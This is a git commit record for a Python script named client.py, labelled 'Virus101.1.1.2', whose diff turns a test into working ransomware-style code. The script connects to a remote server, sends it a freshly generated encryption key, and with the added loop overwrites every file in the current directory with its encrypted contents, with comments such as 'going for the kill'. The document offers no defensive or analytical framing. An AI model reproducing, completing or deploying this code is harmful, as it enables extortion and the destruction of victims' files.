4b0ca2328e4812108d95cfae0d59ff0a435854ca
Tarmica <lilskyforever@gmail.com>
2022-10-02 08:18:14 +0200

    Virus101.1.1.2

--- client.py
+++ client.py
@@ -11,19 +11,10 @@ FORMAT = "utf-8"
 HEADER = 64
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
-
 files = []
- 
+
 for file in os.listdir():
     files.append(file)
-
-#reading file path from argument
-#parser = argparse.ArgumentParser(prog='Jailor', usage='main.py <full path to file>', description='This program encrypts folders and files given in the path as arguments')
-#parser.add_argument('path')
-#args = parser.parse_args()
-
-#defining file path object to use in code
-#filepath = Path(args.path)
 
 #manufacturing encryption key, saving encryption key, sending it to master before finally encrypting
 key = Fernet.generate_key()
@@ -37,10 +28,15 @@ def send(msg):
     client.send(send_length)
     client.send(message)
     
+    
 send(thekey)
 open("backup.txt", "w").write(str(thekey)) 
 
 #finally...going for the kill
 #Fernet(key).encrypt(open(filepath))
-Fernet(key).encrypt(open("test.txt"))
-
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
